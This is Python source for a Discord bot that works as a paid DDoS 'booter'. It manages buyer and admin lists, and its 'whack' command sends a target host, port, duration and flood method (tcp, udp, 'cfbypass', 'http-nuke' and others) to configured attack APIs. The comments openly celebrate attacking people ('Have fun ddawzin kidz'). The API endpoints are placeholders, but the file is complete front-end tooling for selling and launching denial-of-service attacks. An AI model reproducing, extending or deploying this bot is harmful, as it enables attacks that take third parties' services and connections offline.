#import all dem shitz
from discord.ext import commands     
from discord.ext.commands import Bot 
from os import system                
from os import name                  
from colorama import *               
import discord                       
import aiohttp                       
import random     
import asyncio   
from cfonts import render, say                

output = render('     whack', colors=['white', 'red'])
buyers  = [1, 2, 3]              
admins  = [1, 2, 3]              
ownerList  = [1, 2, 3] #Put your ID as one of these, as this cannot be changed by discord commands (due to it being the highest perm)
yourbottoken   = '' #put your bot token here                
bot = commands.Bot(command_prefix='.')

#methods (you can add others, these are just placeholders as there is no api added)
l4methods = ['tcp', 'udp', 'std']             
l7methods = ['http', 'cfbypass', 'http-nuke'] 

#put your api shit here if you're actually gonna use this lol
api_data = [
    {
        'api_url':'api url here', 
        'api_key':'api key here',              
        'max_time':'1200'   #you can change this to whatever tbh
    },
    {
        'api_url':'api url here', 
        'api_key':'api key here',
        'max_time':'300'    #you can change this to whatever tbh
    }
]

#h4x0r pogger cool swag st4tuz
async def status_task():
    while True:
        await bot.change_presence(activity=discord.Game(name="Whackin' Kidz /"))
        await asyncio.sleep(1.5)
        await bot.change_presence(activity=discord.Game(name="Whackin' Kidz -"))
        await asyncio.sleep(1.5)
        await bot.change_presence(activity=discord.Game(name="Whackin' Kidz \\"))
        await asyncio.sleep(1.5)
        await bot.change_presence(activity=discord.Game(name="Whackin' Kidz |"))
        await asyncio.sleep(1.5)
 
#add a buyer to the buyers list.
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="You're not an Admin! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is already a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.append(buyer)
        embed = discord.Embed(title="Buyer Added", description=f"{buyer} has been added to the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete a buyer from the buyers list
@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="You're not an Admin! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer not in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is not a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.remove(buyer)
        embed = discord.Embed(title="Buyer Removed", description=f"{buyer} has been removed from the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#add an admin to the admins list
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="You're not an owner! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(title="Administrator Error", description=f"{admin} is already an Admin!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="Administrator Error", description=f"Please provide an Admins ID", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(title="Administrator Added", description=f"{admin} has been added to the Admin list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete an admin from the admins list
@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="You're not an owner! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin not in admins:
	    embed = discord.Embed(title="Invalid ID", description="This ID doesn't belong to an existing Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    elif admin is None:
	    embed = discord.Embed(title="Invalid ID", description="Please provide an ID of a *current* Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(title="Administrator Removed", description=f"{admin} has been removed...", color=0xa30000)
        await ctx.send(embed=embed)

#this is the 'ddos' command. (I named it whack because that's funny... no? ok...)
@bot.command()
async def whack(ctx, method : str = None, target : str = None, port : str = None, time : str = None):
    #checks if a random noob is using your bot to ddawz people
    if ctx.author.id not in buyers:
	    embed = discord.Embed(title="ARGH!", description="WOAH! You're not a buyer! Stop trying to be naughty! :face_with_symbols_over_mouth:", color=0xa30000)
	    await ctx.send(embed=embed)

    #if the person using the command is a buyer, then proceed:
    else:
        if method is None or method.upper() == 'noob_needs_help_XD': #checks if the person is a retard and didn't use the right args; if true: sends the 'help' embed.
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="How to Use", description=" ", color=0xa30000)
            embed.add_field(name="Command:", value=".whack <method> <target> <port> <time>")
            embed.add_field(name="L4 METHODS:", value=f" {l4methodstr}")
            embed.add_field(name="L7 METHODS:", value=f" {l7methodstr}")

            await ctx.send(embed=embed)

		#check if the user has messed up the args :/
        elif method is None:
            await ctx.send('Please Give a Method :)')

        elif target is None:
            embed = discord.Embed(title="You STOOPID!", description="Please give a valid <target> :person_facepalming: ", color=0xa30000)
            await ctx.send(embed=embed)

        elif port is None:
            embed = discord.Embed(title="You STOOPID!", description="Please give a valid <port> :person_facepalming: ", color=0xa30000)
            await ctx.send(embed=embed)

        elif time is None:
            embed = discord.Embed(title="You STOOPID!", description="Please give a valid <time> :person_facepalming: ", color=0xa30000)
            await ctx.send(embed=embed)

        #checks complete :D, continue !
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time2 = max_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?key={api_key}&host={target}&port={port}&time={time2}&method={method.upper()}') #spooky HAX bababooey
                        print(f'{api_url}/?key={api_key}&host={target}&port={port}&time={time2}&method={method.upper()}') #letting you know DaDetails

                except Exception as e:
                    #print(e)
                    pass

            embed = discord.Embed(title="WHACKED!", description=f"W0w, you WHACKED {target}.", color=0xa30000)
            await ctx.send(embed=embed)

#display suppa kewl ascii + bot info
@bot.event
async def on_ready():
    banner = f"""{Fore.CYAN}

             __        __  _   _      _       ____   _  __
             \ \      / / | | | |    / \     / ___| | |/ /
              \ \ /\ / /  | |_| |   / _ \   | |     | ' / 
               \ V  V /   |  _  |  / ___ \  | |___  | . \ 
                \_/\_/    |_| |_| /_/   \_\  \____| |_|\_]
                                              
                                                                                     
			{Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(output)
    print(f'{Fore.RED}        Logged into Bot: {Fore.YELLOW}{bot.user.name}{Fore.GREEN}. Bot ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}. Have fun ddawzin kidz.{Fore.RESET}\n')
    bot.loop.create_task(status_task())

if __name__ == '__main__':
    init(convert=True)
    bot.run(yourbottoken)
